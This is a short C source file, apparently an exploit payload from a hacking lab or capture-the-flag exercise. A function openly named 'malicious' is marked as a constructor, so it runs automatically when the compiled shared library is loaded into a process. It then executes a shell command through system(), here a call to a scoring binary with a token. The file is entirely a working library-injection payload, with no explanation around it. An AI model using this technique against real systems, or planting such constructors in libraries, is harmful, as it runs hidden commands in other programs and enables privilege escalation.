#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 05a9bba6-a287-49b1-8e1a-9c6a3741d721");
}
